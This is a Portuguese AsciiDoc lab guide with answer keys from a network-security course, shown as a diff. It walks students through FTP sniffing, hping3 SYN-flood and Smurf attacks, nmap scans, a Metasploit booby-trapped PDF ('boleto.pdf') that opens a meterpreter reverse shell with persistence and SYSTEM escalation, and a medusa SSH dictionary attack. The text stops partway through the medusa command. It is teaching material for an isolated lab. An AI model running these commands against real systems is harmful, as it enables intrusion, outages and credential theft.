@@ -1,0 +1,678 @@
+ifdef::oneof[]
+////
+= SEG2 - Sessão 2
+:Author: Francisco_Marcelo,_Marcelo_Karam_e_Felipe_Scarel
+:Author Initials: FM & MK & FS
+////
+:doctype: article
+:source-highlighter: rouge
+:listing-caption: Listing
+:pdf-page-size: A4
+:revdate: 25-09-2018
+:imagesdir: ../img
+:srcdir: ../src
+:icons: font
+include::../../share/attributes.adoc[]
+endif::oneof[]
+
+== Sessão 2: Explorando vulnerabilidades em redes
+
+=== 1) Transferindo arquivos da máquina física para as VMs
+
+[WARNING]
+====
+Esta atividade será realizada em sua máquina física (hospedeira).
+====
+
+Muito frequentemente teremos, neste curso, de mover programas e arquivos localizados na máquina física para uma das máquinas virtuais executando no Virtualbox. Para configurar o ambiente para que essas cópias sejam fáceis, siga os passos a seguir:
+
+1. Dentro da console do Virtualbox de uma máquina virtual (neste exemplo, vamos usar a VM _WinServer-G_), acesse o menu _Devices_ > _Shared Folders_ > _Shared Folder Settings..._ .
+
+2. Clique na pasta com o ícone `+` no canto superior da tela, que diz _Adds new shared folder_.
+
+3. Em _Folder Path_, clique na seta e depois em _Other..._ . Em seguida, navegue até a pasta a ser compartilhada entre a máquina física e a VM e clique em _Select Folder_. Abaixo, marque as caixas _Auto-mount_ e _Make Permanent_. Sua janela deve ficar assim:
++
+.Configuração de pasta compartilhada no Virtualbox
+[#img-sharedfolder]
+[caption="Figura 16: "]
+image::Vbox_sharedfolder.png[align="center"]
+
+4. Agora, reinicie a máquina _WinServer-G_. Após o _reboot_, abra o Windows Explorer e verifique que há um novo local de rede montado. No exemplo abaixo, a pasta compartilhada tem o nome _SEG12_Semana2_Programas_.
++
+.Visualização de pasta compartilhada no Virtualbox
+[#img-sharedfolder-view]
+[caption="Figura 17: "]
+image::Vbox_sharedfolder_view.png[align="center"]
+
+5. Pronto! Agora, basta fazer o download de programas e arquivos em sua máquina física, colocá-los dentro da pasta compartilhada, e suas VMs terão acesso imediato. Se desejar, repita o procedimento para a máquina _WinClient-G_.
+
+=== 2) *_Sniffers_* para captura de dados
+
+[WARNING]
+====
+Esta atividade será realizada na máquina virtual _WinServer-G_.
+====
+
+Primeiro, baixe e instale o _Microsoft Visual C++ Redistributable Packages for Visual Studio 2013_ (https://www.microsoft.com/en-US/download/details.aspx?id=40784), como usuário _Administrator_, na máquina _WinServer-G_. Se preferir, faça o download na máquina física e copie o arquivo via pasta compartilhada, como explicado na atividade 1.
+
+Em seguida, faça o download do Wireshark (versão 32-bit) em https://www.wireshark.org/download/win32/all-versions/Wireshark-win32-2.2.16.exe e, como usuário _Administrator_, instale-o na máquina _WinServer-G_. Iremos instalar a versão 2.2 porque é a última compatível com Windows Vista/Windows Server 2008, que é o sistema operacional da máquina _WinServer-G_.
+
+Em seguida:
+
+1. Ative a captura de pacotes da placa de rede ethernet -- o nome da interface deve ser _Local Area Connection_.
+
+2. No campo _Apply a display filter_, digite `ftp` e pressione ENTER. A janela de captura deve ficar vazia, já que não há tráfego FTP acontecendo no momento.
+
+3. Em outra janela, abra o _prompt_ de comando e digite `ftp linorg.usp.br` .
+
+4. A seguir, informe o usuário como sendo `aluno`, com senha `123456` .
+ifdef::gabarito[]
++
+.Envio de usuário/senha por FTP
+[#img-ftp-wronguser]
+[caption="Figura 18: "]
+image::Wireshark_ftp_wronguser.png[align="center"]
+endif::gabarito[]
+
+5. De volta ao Wireshark, pare a captura de pacotes e verifique se você consegue visualizar o usuário e a senha informados.
+ifdef::gabarito[]
++
+Na imagem abaixo podemos confirmar que, de fato, o usuário e senha são passados em claro pela rede. Mais além, pode-se identificar o _banner_ do serviço (ProFTPD 1.3.5b).
++
+.Captura de sessão FTP no Wireshark
+[#img-wireshark-ftp]
+[caption="Figura 19: "]
+image::Wireshark_ftp_capture.png[align="center"]
+endif::gabarito[]
+
+=== 3) Ataque SYN *_flood_*
+
+[WARNING]
+====
+Esta atividade será realizada nas máquinas virtuais _FWGW1-G_ e _KaliLinux-G_.
+====
+
+Agora, vamos identificar e compreender ataques DoS (_Denial of Service_) e fazer a análise com um sniffer (Wireshark e/ou `tcpdump`) para interpretar o modo como os pacotes são elaborados para o respectivo ataque DOS.
+
+Primeiro, vamos investigar o ataque _SYN flood_. Como tratado na parte teórica do curso, esse ataque consiste em enviar uma grande número de pacotes com a flag SYN ativa. Para realizar o ataque, iremos utilizar a ferramenta `hping3`.
+
+1. Será necessário desativar a proteção contra _SYN Flooding_ do kernel da máquina-alvo, que será a VM _FWGW1-G_. Altere o valor do parâmetro no arquivo `/proc/sys/net/ipv4/tcp_syncookies`.
+ifdef::gabarito[]
++
+....
+# hostname
+FWGW1-A
+
+# cat /proc/sys/net/ipv4/tcp_syncookies
+1
+
+# echo 0 > /proc/sys/net/ipv4/tcp_syncookies
+....
+endif::gabarito[]
+
+2. Agora, vamos iniciar uma captura de pacotes, aguardando o ataque. Ainda na máquina _FWGW1-G_, instale o `tcpdump` e monitore os pacotes vindos da DMZ, através da interface `eth1`.
+ifdef::gabarito[]
++
+....
+# apt-get install tcpdump
+
+(...)
+
+# tcpdump ip -i eth1 -n host not 172.16.1.254
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
+....
++
+Note que o filtro acima exclui pacotes IPv6 e pacotes vindos da máquina física (que também encontra-se conectada à rede _host-only_, com o endereço 172.16.1.254), para não atrapalhar o processo de análise.
+endif::gabarito[]
+
+3. Na máquina _KaliLinux-G_, como usuário `root`, use o `hping3` para iniciar um ataque _SYN flood_ com destino à máquina _FWGW1-G_, na porta do serviço SSH (com o objetivo, no caso do atacante, de esgotar os recursos de atendimento do serviço a usuários legítimos), com máxima velocidade de output e randomizando os IPs de origem dos pacotes.
+ifdef::gabarito[]
++
+....
+# hostname
+kali
+
+# hping3 172.16.1.1 -S -p 22 --flood --rand-source
+HPING 172.16.1.1 (eth0 172.16.1.1): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+....
++
+--
+* `-S` ativa a _flag_ SYN nos pacotes.
+* `-p 22` determina que a porta de destino será 22/TCP.
+* `--flood` envia pacotes o mais rápido possível, sem mostrar respostas.
+* `--rand-source` habilita o modo de envio com endereços de origem randomizados.
+--
+endif::gabarito[]
+
+4. Pare a execução do `hping` com CTRL+C. De volta à máquina _FWGW1-G_, verifique que o ataque está sendo realizado como esperado e interprete a saída do `tcpdump`.
+ifdef::gabarito[]
++
+Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do _output_ do `tcpdump`:
++
+....
+14:34:46.611124 IP 37.216.172.87.61777 > 172.16.1.1.22: Flags [S], seq 1722418881, win 512, length 0
+14:34:46.612051 IP 196.103.179.0.61789 > 172.16.1.1.22: Flags [S], seq 656608080, win 512, length 0
+14:34:46.612064 IP 237.165.139.119.61790 > 172.16.1.1.22: Flags [S], seq 584215547, win 512, length 0
+14:34:46.612069 IP 41.126.172.32.61791 > 172.16.1.1.22: Flags [S], seq 520478412, win 512, length 0
+14:34:46.612074 IP 164.4.165.114.61792 > 172.16.1.1.22: Flags [S], seq 316807998, win 512, length 0
+14:34:46.612079 IP 239.174.101.252.61793 > 172.16.1.1.22: Flags [S], seq 797534175, win 512, length 0
+14:34:46.612082 IP 80.98.63.179.61794 > 172.16.1.1.22: Flags [S], seq 1624228209, win 512, length 0
+14:34:46.612086 IP 92.168.164.203.61795 > 172.16.1.1.22: Flags [S], seq 1084913676, win 512, length 0
+....
++
+Note que os IPs de origem são todos distintos, como esperado. Além disso, todos possuem a _flag_ SYN ativada e objetivam a porta 22/TCP do servidor, numa tentativa de exaurir recursos para tratamento de conexão de novos clientes.
++
+Assim que o servidor recebe o SYN inicial, ele aloca memória para atender o cliente e responde com um SYN-ACK. No caso de um ataque SYN _flood_, como o desta atividade, o atacante envia um grande número de pacotes SYN sem qualquer intenção de responder o SYN-ACK recebido com um ACK (e, assim, fechar o _three-way handshake_). Se o atacante estiver usando endereços IP _spoofed_, o que estamos fazendo, o SYN-ACK sequer chega a ser recebido.
++
+Durante este período o servidor não pode fechar a conexão com um pacote RST, e ela permanece aberta. Antes do _timeout_, outros pacotes SYN vindos do atacante chegam, e começam a deixar um número crescente de conexões em estado _half-open_. Eventualmente, as tabelas de _overflow_ de conexão de servidor ficam cheias, e clientes legítimos têm seu acesso negado ao serviço.
+endif::gabarito[]
+
+5. Reative a proteção _TCP SYN Cookies_ do kernel da máquina _FWGW1-G_.
+ifdef::gabarito[]
++
+....
+# hostname
+FWGW1-A
+
+# echo 1 > /proc/sys/net/ipv4/tcp_syncookies
+....
++
+Os SYN _cookies_ implementam uma proteção em que o servidor responde cada SYN inicial com um SYN-ACK contendo o hash criptográfico de um número de sequência construído a partir do endereço IP do cliente, número de porta e outras informações de identificação. Quando o cliente responde, esse hash deve ser incluído no pacote ACK. Finalmente, o servidor verifica esse ACK e só então aloca memória para a conexão.
+endif::gabarito[]
+
+=== 4) Ataque *_Smurf_*
+
+[WARNING]
+====
+Esta atividade será realizada nas máquinas virtuais _FWGW1-G_, _LinServer-G_ e _KaliLinux-G_.
+====
+
+Agora, vamos trabalhar o ataque _Smurf_. Como já tratado na parte teórica deste curso, esse ataque consiste no envio de pacotes ICMP _echo-request_ para o endereço de _broadcast_ de uma rede desprotegida. Assim, todas as máquinas responderão para o endereço de origem especificado no pacote que deve estar alterado para o endereço alvo (efetivamente, realizando um _spoofing_).
+
+1. Será necessário desativar a proteção contra ICMP _echo-request_ para endereço de broadcast no kernel da máquina-alvo, que será a VM _FWGW1-G_, bem como nas máquinas que responderão aos _echo-requests_ (_KaliLinux-G_ e _LinServer-G_). Altere o valor do parâmetro no arquivo `/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts` nas três máquinas.
+ifdef::gabarito[]
++
+....
+# hostname
+FWGW1-A
+
+# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
+
+(...)
+....
++
+....
+# hostname
+LinServer-A
+
+# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
+
+(...)
+....
++
+....
+# hostname
+kali
+
+# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
+....
+endif::gabarito[]
+
+2. Inicie a captura de pacotes, aguardando o ataque. Na máquina _FWGW1-G_, use o `tcpdump` para monitorar os pacotes vindos da DMZ, através da interface `eth1`.
+ifdef::gabarito[]
++
+....
+# tcpdump ip -i eth1 -n host not 172.16.1.254
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
+....
+endif::gabarito[]
+
+3. Na máquina _KaliLinux-G_, use o `hping3` para iniciar um ataque _Smurf_ com destino à máquina _FWGW1-G_. Envie pacotes ICMP com a máxima velocidade possível para o endereço de _broadcast_ da rede, falsificando a origem com o IP da vítima.
+ifdef::gabarito[]
++
+....
+# hostname
+kali
+
+# hping3 172.16.1.255 --icmp --flood --spoof 172.16.1.1
+HPING 172.16.1.255 (eth0 172.16.1.255): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+....
++
+--
+* `--icmp` ativa o modo ICMP; por padrão, o `hping3` envia pacotes do tipo _echo-request_, que é o que objetivamos.
+* `--flood` envia pacotes o mais rápido possível, sem mostrar respostas.
+* `--spoof 172.16.1.1` falsifica o IP de origem dos pacotes enviados para _broadcast_ como sendo o IP da máquina _FWGW1-G_.
+--
+endif::gabarito[]
+
+4. De volta à máquina _FWGW1-G_, verifique que o ataque está sendo realizado como esperado e interprete a saída do `tcpdump`.
+ifdef::gabarito[]
++
+Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do _output_ do `tcpdump`:
++
+....
+14:56:31.489287 IP 172.16.1.1 > 172.16.1.255: ICMP echo request, id 1036, seq 56940, length 8
+14:56:31.489291 IP 172.16.1.30 > 172.16.1.1: ICMP echo reply, id 1036, seq 57196, length 8
+14:56:31.489292 IP 172.16.1.1 > 172.16.1.255: ICMP echo request, id 1036, seq 57196, length 8
+14:56:31.489294 IP 172.16.1.30 > 172.16.1.1: ICMP echo reply, id 1036, seq 57452, length 8
+14:56:31.489295 IP 172.16.1.1 > 172.16.1.255: ICMP echo request, id 1036, seq 57452, length 8
+14:56:31.489297 IP 172.16.1.30 > 172.16.1.1: ICMP echo reply, id 1036, seq 57708, length 8
+14:56:31.490336 IP 172.16.1.10 > 172.16.1.1: ICMP echo reply, id 1036, seq 45932, length 8
+14:56:31.490347 IP 172.16.1.10 > 172.16.1.1: ICMP echo reply, id 1036, seq 46188, length 8
+....
++
+Note que a máquina _FWGW1-G_ identifica o seu próprio IP como sendo o originário dos pacotes _echo-request_ enviados para _broadcast_. A seguir, as máquinas _LinServer-G_ e _KaliLinux-G_ (esta, a atacante), respondem em massa com ICMP _echo-replies_ para a vítima, sobrecarregando seus recursos.
++
+Finalmente, pode-se usar também a opção `-d` (ou `--data`, para _data size_) do `hping3`, fazendo com que o tamanho dos pacotes _echo-request_ -- e por conseguinte dos _echo-replies_ -- seja tão grande quanto o definido na linha de comando. Isso pode ser utilizado para dar mais força ao ataque, e consumir mais rapidamente a band da vítima.
+endif::gabarito[]
+
+5. Reative a proteção para ignorar ICMP _echo-requests_ direcionados a _broadcast_ do kernel das máquinas _FWGW1-G_, _LinServer-G_ e _KaliLinux-G_.
+ifdef::gabarito[]
++
+....
+# hostname
+FWGW1-A
+
+# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
+
+(...)
+
+# hostname
+LinServer-A
+
+# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
+
+(...)
+
+# hostname
+kali
+
+# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
+....
+endif::gabarito[]
+
+=== 5) Levantamento de serviços usando o *_nmap_*
+
+[WARNING]
+====
+Esta atividade será realizada nas máquinas virtuais _FWGW1-G_, _WinServer-G_ e _KaliLinux-G_.
+====
+
+Agora, vamos entender o funcionamento e utilidades da ferramenta `nmap`.
+
+1. Na máquina _WinServer-G_, inicie o Wireshark e faça-o escutar por pacotes vindos para a interface _Local Area Connection_. Em paralelo, na máquina _KaliLinux-G_, use o `nmap` para fazer um _scan_ _verbose_ da máquina _WinServer-G_. Analise e compare os resultados obtidos pelo `nmap` com o que foi observado no Wireshark.
+ifdef::gabarito[]
++
+Primeiro, vamos ver o que acontece na máquina _KaliLinux-G_:
++
+....
+# nmap -v 172.16.1.20
+
+Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2018-08-18 01:19 EDT
+Initiating ARP Ping Scan at 01:19
+Scanning 172.16.1.20 [1 port]
+Completed ARP Ping Scan at 01:19, 0.20s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 01:19
+Completed Parallel DNS resolution of 1 host. at 01:19, 0.03s elapsed
+Initiating SYN Stealth Scan at 01:19
+(...)
+Completed SYN Stealth Scan at 01:20, 24.20s elapsed (1000 total ports)
+Nmap scan report for 172.16.1.20
+Host is up (0.00022s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5357/tcp  open  wsdapi
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+MAC Address: 08:00:27:44:C2:10 (Cadmus Computer Systems)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 24.54 seconds
+           Raw packets sent: 1660 (73.024KB) | Rcvd: 1135 (45.436KB)
+....
++
+Solicita-se um _scan_ _verbose_ da máquina _WinServer-G_. Após resolução ARP/DNS, o `nmap` escaneia as mil portas mais comuns para cada protocolo. Depois, ele relata quais portas foram detectadas como abertas, juntamente com o nome de serviço que usualmente escuta naquela porta.
++
+Mas... que mil portas são essas? Elas são definidas no arquivo `/usr/share/nmap/nmap-services`, que possui grande similaridade com o arquivo `/etc/services` -- mas, além de listar o serviço na primeira coluna e porta/protocolo na segunda coluna, há uma terceira coluna que indica a probabilidade que uma dada porta seja encontrada aberta. Essa probabilidade é obtida pela equipe do `nmap` a partir de _scans_ de pesquisa na Internet ao largo.
++
+Por exemplo, para descobrir quais são as dez portas mais populares, basta executar:
++
+....
+# cat /usr/share/nmap/nmap-services | grep -v '^#' | awk '{print $3,$2,$1}' | sort -n | tac | head -n10
+....
++
+....
+0.484143 80/tcp http
+0.450281 631/udp ipp
+0.433467 161/udp snmp
+0.365163 137/udp netbios-ns
+0.330879 123/udp ntp
+0.297830 138/udp netbios-dgm
+0.293184 1434/udp ms-sql-m
+0.253118 445/udp microsoft-ds
+0.244452 135/udp msrpc
+0.228010 67/udp dhcps
+....
++
+Finalmente, vamos ver o que aparece no Wireshark da máquina _WinServer-G_:
++
+.Captura de scan nmap contra a máquina WinServer-G
+[#img-nmap-verbose]
+[caption="Figura 20: "]
+image::nmap-verbose.png[align="center"]
++
+Note que uma série de pacotes SYN são enviados para diferentes portas do servidor Windows. Por sua vez, o Windows responde com um ACK se a porta estiver aberta, mas o `nmap` não envia um SYN/ACK em resposta a esse pacote -- esse é o modo padrão de _scan_ do `nmap`, TCP SYN, também conhecido como _half-open scan_.
+endif::gabarito[]
+
+2. Vamos agora explorar outros modos de funcionamento do `nmap`. Teste os modos: (1) _TCP connect scan_, (2) _TCP NULL scan_, (3) _TCP FIN scan_ e (4) _TCP Xmas scan_, e acompanhe o andamento da varredura de portas através do Wireshark. Procure entender o que está acontecendo e a diferença entre comandos executados, para verificar os conceitos do material teórico.
++
+[TIP]
+====
+Recomenda-se a leitura da página de manual do `nmap`, via comando `$ man 1 nmap`, para estudar o que cada um desses tipos de _scan_ objetiva. A página de manual do `nmap` é extremamente detalhada e bem-escrita, e uma fonte valiosa de conhecimento relativo à enumeração e teste de vulnerabilidades de máquinas-alvo.
+
+O guia de referência do `nmap` também possui um capítulo dedicado às diferentes técnicas para _port scanning_, acessível em https://nmap.org/book/man-port-scanning-techniques.html .
+====
+ifdef::gabarito[]
++
+Respectivamente, os _scans_ do tipo _connect_, _NULL_, _FIN_ e _Xmas_ podem ser realizados com os comandos:
++
+....
+# nmap -sT 172.16.1.20
+# nmap -sN 172.16.1.20
+# nmap -sF 172.16.1.20
+# nmap -sX 172.16.1.20
+....
+endif::gabarito[]
+
+3. Outra funcionalidade do `nmap` é o _OS fingerprinting_. Utilize a opção que ativa essa verificação nas máquinas virtuais _FWGW1-G_ e _WinServer-G_. Use o `tcpdump` e o Wireshark para verificar a troca de pacotes neste processo.
+ifdef::gabarito[]
++
+Primeiro, vamos escanear a máquina _FWGW1-G_, realizando o _OS fingerprinting_ (opção `-O`):
++
+....
+# nmap -O 172.16.1.1
+
+(...)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.19
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds
+....
++
+Detectou-se que o SO da máquina-alvo é um kernel Linux, versões 3.2 a 3.19. Vamos verificar se o `nmap` está correto, logando na máquina _FWGW1-G_ e imprimindo a versão do kernel:
++
+....
+# hostname
+FWGW1-A
+
+# uname -r
+3.16.0-4-amd64
+....
++
+Perfeito! Vamos partir para o _scan_ da máquina _WinServer-G_:
++
+....
+# nmap -O 172.16.1.20
+
+(...)
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows 8, or Windows 8.1 Update 1
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 84.62 seconds
+....
++
+Vamos verificar se a informação está correta:
++
+.Versão do SO na máquina WinServer-G
+[#img-nmap-osdetect-windows]
+[caption="Figura 21: "]
+image::nmap-osdetect-windows.png[align="center"]
++
+Bastante próximo -- o `nmap` reporta Windows Server 2008 SP1, e o _WinServer-G_ é um Windows Server 2008 SP2.
+endif::gabarito[]
+
+=== 6) Realizando um ataque com o Metasploit
+
+[WARNING]
+====
+Esta atividade será realizada nas máquinas virtuais _WinServer-G_ e _KaliLinux-G_.
+====
+
+Nessa atividade iremos executar uma série de comandos utilizando o `metasploit` disponível na máquina _KaliLinux-G_. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos instalar em servidores programas desnecessários, como visualizadores de PDF.
+
+1. Instale o _Adobe Reader_ versão 9.3.4 na máquina _WinServer-G_. Esse programa pode ser encontrado no AVA, ou na pasta compartilhada via rede pelo instrutor.
+
+2. Agora, vamos gerar um arquivo PDF malicioso para explorar a vulnerabilidade do _Adobe Reader_ instalado no passo (1). Acesse a máquina _KaliLinux-G_ e execute:
++
+....
+# hostname
+kali
+
+# msfconsole
+
+msf > use exploit/windows/fileformat/adobe_cooltype_sing
+
+msf exploit(adobe_cooltype_sing) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+
+msf exploit(adobe_cooltype_sing) > set FILENAME boleto.pdf
+FILENAME => boleto.pdf
+
+msf exploit(adobe_cooltype_sing) > set LHOST 172.16.1.30
+LHOST => 172.16.1.30
+
+msf exploit(adobe_cooltype_sing) > set LPORT 4444
+LPORT => 4444
+
+msf exploit(adobe_cooltype_sing) > exploit
+
+[*] Creating 'boleto.pdf' file...
+[+] boleto.pdf stored at /root/.msf4/local/boleto.pdf
+....
++
+O que foi feito?
++
+--
+a. Escolhemos o _exploit_ a ser utilizado -- no caso, o `adobe_cooltype_sing`.
+b. Selecionamos o _payload_ a ser enviado junto com o arquivo PDF que será gerado -- `windows/meterpreter/reverse_tcp`. O `reverse_tcp` é um _payload_ que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.
+c. Selecionamos o nome do arquivo -- `boleto.pdf` . Um nome (e conteúdo) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser visualizado.
+d. Selecionamos o _host_ local -- esse é o IP da máquina que iniciará o _handler_ da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina _KaliLinux-G_, 172.16.1.30.
+e. Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria até melhor selecionar uma porta popular, como 80 ou 443, que provavelmente serão liberadas pelo firewall da rede.
+f. Finalmente, executamos `exploit`. No caso particular desse _exploit_, esse comando produziu o PDF malicioso objetivado, e o gravou no arquivo `/root/.msf4/local/boleto.pdf`.
+--
+
+3. O próximo passo é disponibilizar o PDF para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado -- basta copiar o arquivo gerado no passo anterior para a pasta `/var/www/html`, retirar o arquivo `index.html` dessa pasta para que a listagem de arquivos seja feita no navegador, e iniciar o serviço. Abra um novo terminal e faça isso:
++
+....
+# mv /root/.msf4/local/boleto.pdf /var/www/html/
+
+# mv /var/www/html/index.html /var/www/html/index.html.bak
+
+# systemctl start apache2
+....
+
+4. Agora, vamos fazer o download do arquivo PDF na máquina _WinServer-G_. Mas, antes disso, no entanto, precisamos iniciar o _handler_ na máquina _KaliLinux-G_, que irá escutar a conexão TCP reversa:
++
+....
+# hostname
+kali
+
+# msfconsole
+
+msf > use exploit/multi/handler
+
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+
+msf exploit(handler) > set LHOST 172.16.1.30
+LHOST => 172.16.1.30
+
+msf exploit(handler) > set LPORT 4444
+LPORT => 4444
+
+msf exploit(handler) > exploit
+
+[*] Started reverse handler on 172.16.1.30:4444
+[*] Starting the payload handler...
+....
++
+<<<
+
+5. Perfeito, agora sim. Na máquina _WinServer-G_, acesse a URL http://172.16.1.30 (ajuste o endereço IP se você pertencer ao grupo `B`). Você deve ver o PDF disponível para download:
++
+.PDF malicioso disponível para download no browser
+[#img-metasploit-browser]
+[caption="Figura 22: "]
+image::metasploit-browser.png[align="center"]
++
+<<<
+
+6. Faça o download do PDF na máquina _WinServer-G_ -- será necessário adicionar a máquina _KaliLinux-G_ à lista de _Trusted sites_ do Internet Explorer antes de o download ser permitido. Depois, clique duas vezes no documento. O _Adobe Reader_ irá iniciar, e uma tela vazia será apresentada, como a que se segue:
++
+.Exploit do Adobe Reader com sucesso
+[#img-metasploit-pdf]
+[caption="Figura 23: "]
+image::metasploit-pdf.png[align="center"]
+
+7. De volta à console do _KaliLinux-G_, observe que o _handler_ recebeu a conexão reversa e iniciou o _meterpreter_, um _payload_ avançado que irá permitir-nos controlar a máquina _WinServer-G_ remotamente.
++
+....
+[*] Started reverse handler on 172.16.1.30:4444
+[*] Starting the payload handler...
+[*] Sending stage (885806 bytes) to 172.16.1.20
+[*] Meterpreter session 1 opened (172.16.1.30:4444 -> 172.16.1.20:49173) at 2018-08-18 02:27:47 -0400
+
+meterpreter >
+....
+
+8. Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos executar o módulo `persistence` do `meterpreter` -- trata-se de um _script_ Ruby que irá criar um serviço do `meterpreter` que será iniciado assim que a máquina for ligada.
++
+....
+meterpreter > run persistence -X
+[*] Running Persistance Script
+[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20180818.3516/WINSERVER-A_20180818.3516.rc
+[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=4444
+[*] Persistent agent script is 148489 bytes long
+[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
+[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
+[+] Agent executed with PID 2576
+[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
+[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
+....
+
+9. A última etapa é escalar privilégios dentro da máquina-alvo. Se você executar o comando `getuid`, irá notar que o `meterpreter` está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário `Administrator`).
++
+....
+meterpreter > getuid
+Server username: WINSERVER-A\Administrator
+....
+
+10. O Windows possui uma conta com privilégios ainda mais elevados que o `Administrator`, a conta `SYSTEM`. Essa conta possui os mesmos privilégios do administrador, mas pode também gerenciar todos os serviços, arquivos e volumes em nível de sistema operacional -- com efeito, uma espécie de "super-root" do SO. Felizmente, o `meterpreter` possui o _script_ `getsystem`, que permite a escalada de privilégio de forma automática:
++
+....
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+....
++
+<<<
+
+11. Efetivamente, agora a máquina _WinServer-G_ está totalmente dominada. Agora, faça testes com os comandos que se seguem para determinar quais são as possibilidades apresentadas pelo `meterpreter` -- sua imaginação é o limite!
++
+.Comandos do meterpreter, parte 1
+[#img-meterpreter-commands-p1]
+[caption="Figura 24: "]
+image::meterpreter-commands-p1.png[align="center"]
++
+.Comandos do meterpreter, parte 2
+[#img-meterpreter-commands-p2]
+[caption="Figura 25: "]
+image::meterpreter-commands-p2.png[align="center"]
+
+=== 7) Realizando um ataque de dicionário com o *_medusa_*
+
+[WARNING]
+====
+Esta atividade será realizada nas máquinas virtuais _FWGW1-G_ e _KaliLinux-G_.
+====
+
+1. Vamos realizar um ataque de força bruta ao serviço SSH utilizando o `medusa`. Na máquina _FWGW1-G_, crie um usuário chamado `marcelo` com a senha `123456` e outro chamado `marco` com a senha `abacate`. Depois, ainda na máquina alvo, monitore o arquivo de log `/var/log/auth.log` por tentativas de login.
+ifdef::gabarito[]
++
+....
+# hostname
+FWGW1-A
+
+# useradd -m marcelo ; echo 'marcelo:123456' | chpasswd
+# useradd -m marco ; echo 'marco:abacate' | chpasswd
+
+# tail -f -n0 /var/log/auth.log
+....
+endif::gabarito[]
+
+2. Na máquina _KaliLinux-G_, o primeiro passo é descobrir o _banner_ de serviço do SSH. Execute o comando `$ nc 172.16.1.1 22` (adapte o endereço IP se necessário) e copie o valor mostrado.
+ifdef::gabarito[]
++
+....
+# hostname
+kali
+
+# nc 172.16.1.1 22
+SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1
+....
+endif::gabarito[]
+
+3. Agora, crie dois arquivos -- um com uma lista de usuários cujo nome será usado para login, e outro com uma lista de senhas. Não se esqueça de incluir na lista de usuários os nomes dos que foram criados no passo (1) desta atividade, bem como suas senhas no outro arquivo.
+ifdef::gabarito[]
++
+....
+# pwd
+/root
+
+# cat users.txt
+root
+marcelo
+marco
+silva
+
+# cat passwords.txt
+rnpesr
+123456
+abacate
+framboesa
+....
+endif::gabarito[]
+
+4. Finalmente, use o comando `medusa` para executar um ataque de dicionário contra a máquina-alvo. Não se esqueça de informar o _banner_ de serviço capturado no passo (2), bem como os arquivos de usuários/senhas criados no passo (3).
+ifdef::gabarito[]
++
+....
+# medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
